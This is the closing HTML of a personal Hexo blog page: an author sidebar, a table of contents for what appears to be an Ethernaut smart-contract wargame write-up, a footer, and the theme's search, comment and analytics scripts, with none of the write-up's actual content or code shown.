            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/ainevsia" title="GitHub &rarr; https://github.com/ainevsia" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="mailto:zhipengxu@sjtu.edu.cn" title="E-Mail &rarr; mailto:zhipengxu@sjtu.edu.cn" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://weibo.com/u/2852659417" title="Weibo &rarr; https://weibo.com/u/2852659417" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://raw.githubusercontent.com/Ainevsia/Ainevsia.github.io/master/PGP-Public-Key.txt" title="PGP-Key &rarr; https://raw.githubusercontent.com/Ainevsia/Ainevsia.github.io/master/PGP-Public-Key.txt" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>PGP-Key</a>
                </span>
              
            </div>
          

          
             <div class="cc-license motion-element" itemprop="license">
              
                
              
              
              
              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
             </div>
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                我的朋友们
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://zhaobairen.club/" title="http://zhaobairen.club/" rel="noopener" target="_blank">Retr_0</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://rooki3ray.github.io/" title="https://rooki3ray.github.io/" rel="noopener" target="_blank">rooki3ray</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://entropy2333.xyz/" title="https://entropy2333.xyz/" rel="noopener" target="_blank">entropy2333</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://schenk75.github.io/" title="https://schenk75.github.io/" rel="noopener" target="_blank">schenk75</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://thomas-li-sjtu.github.io/" title="https://thomas-li-sjtu.github.io/" rel="noopener" target="_blank">thomas-li-sjtu</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-0-Hello-Ethernaut"><span class="nav-number">1.</span> <span class="nav-text">Level 0. Hello Ethernaut</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-1-Fallback"><span class="nav-number">2.</span> <span class="nav-text">Level 1. Fallback</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-2-Fallout"><span class="nav-number">3.</span> <span class="nav-text">Level 2. Fallout</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-3-Coin-Flip"><span class="nav-number">4.</span> <span class="nav-text">Level 3. Coin Flip</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-4-Telephone"><span class="nav-number">5.</span> <span class="nav-text">Level 4. Telephone</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-5-Token"><span class="nav-number">6.</span> <span class="nav-text">Level 5. Token</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-6-Delegation"><span class="nav-number">7.</span> <span class="nav-text">Level 6. Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source"><span class="nav-number">7.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">7.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-7-Force"><span class="nav-number">8.</span> <span class="nav-text">Level 7. Force</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-1"><span class="nav-number">8.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Decompiled"><span class="nav-number">8.2.</span> <span class="nav-text">Decompiled</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-1"><span class="nav-number">8.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-8-Vault"><span class="nav-number">9.</span> <span class="nav-text">Level 8. Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-2"><span class="nav-number">9.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-2"><span class="nav-number">9.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-9-King"><span class="nav-number">10.</span> <span class="nav-text">Level 9. King</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-3"><span class="nav-number">10.1.</span> <span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-10-Re-entrancy"><span class="nav-number">11.</span> <span class="nav-text">Level 10. Re-entrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-4"><span class="nav-number">11.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">11.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">11.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-11-Elevator"><span class="nav-number">12.</span> <span class="nav-text">Level 11. Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-5"><span class="nav-number">12.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">12.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-12-Privacy"><span class="nav-number">13.</span> <span class="nav-text">Level 12. Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-6"><span class="nav-number">13.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp"><span class="nav-number">13.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-13-Gatekeeper-One"><span class="nav-number">14.</span> <span class="nav-text">Level 13. Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-7"><span class="nav-number">14.1.</span> <span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-14-Gatekeeper-Two"><span class="nav-number">15.</span> <span class="nav-text">Level 14. Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-8"><span class="nav-number">15.1.</span> <span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-15-Naught-Coin"><span class="nav-number">16.</span> <span class="nav-text">Level 15. Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-9"><span class="nav-number">16.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">16.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">16.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-16-Preservation"><span class="nav-number">17.</span> <span class="nav-text">Level 16. Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-10"><span class="nav-number">17.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-1"><span class="nav-number">17.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">17.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insights"><span class="nav-number">17.4.</span> <span class="nav-text">Insights</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-17-Recovery"><span class="nav-number">18.</span> <span class="nav-text">Level 17. Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-11"><span class="nav-number">18.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-2"><span class="nav-number">18.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-2"><span class="nav-number">18.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-18-MagicNumber"><span class="nav-number">19.</span> <span class="nav-text">Level 18. MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-12"><span class="nav-number">19.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-3"><span class="nav-number">19.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-3"><span class="nav-number">19.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-19-Alien-Codex"><span class="nav-number">20.</span> <span class="nav-text">Level 19. Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-13"><span class="nav-number">20.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-4"><span class="nav-number">20.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-4"><span class="nav-number">20.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insights-1"><span class="nav-number">20.4.</span> <span class="nav-text">Insights</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-20-Denial"><span class="nav-number">21.</span> <span class="nav-text">Level 20. Denial</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-14"><span class="nav-number">21.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-5"><span class="nav-number">21.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-5"><span class="nav-number">21.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-21-Shop"><span class="nav-number">22.</span> <span class="nav-text">Level 21. Shop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-15"><span class="nav-number">22.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-6"><span class="nav-number">22.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-6"><span class="nav-number">22.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-22-Dex"><span class="nav-number">23.</span> <span class="nav-text">Level 22. Dex</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-16"><span class="nav-number">23.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-7"><span class="nav-number">23.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-7"><span class="nav-number">23.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#通关留念"><span class="nav-number">24.</span> <span class="nav-text">通关留念</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ainevsia</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">站点总字数：</span>
    
    <span title="站点总字数">283k</span>
  

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    
    <span title="站点阅读时长">4:18</span>
  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.0.0</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>






















  
  
  <script id="ribbon" size="200" alpha="0.3" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>





  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=7.0.0"></script>

  <script src="/js/src/motion.js?v=7.0.0"></script>



  
  


  <script src="/js/src/affix.js?v=7.0.0"></script>

  <script src="/js/src/schemes/pisces.js?v=7.0.0"></script>




  
  <script src="/js/src/scrollspy.js?v=7.0.0"></script>
<script src="/js/src/post-details.js?v=7.0.0"></script>



  


  <script src="/js/src/bootstrap.js?v=7.0.0"></script>



  
  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: true,
    appId: 'uxxXkzDF0R4FFwG4j5rxjPHA-gzGzoHsz',
    appKey: 'bUp11H8Kr3o92XHiSuaLEAqt',
    placeholder: 'Do you want to say anything?',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false
  });
</script>




  


  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
  

  
  

  
    
      <script type="text/x-mathjax-config">
  

  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true,
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      
      equationNumbers: {
        autoNumber: "AMS"
      }
    }
  });
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
      for (i = 0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>
<script src="//cdn.jsdelivr.net/npm/mathjax@2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

<style>
.MathJax_Display {
  overflow: auto hidden;
}
</style>

    
  


  

  

  

  

  

  

  

  

  

  

  
  
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
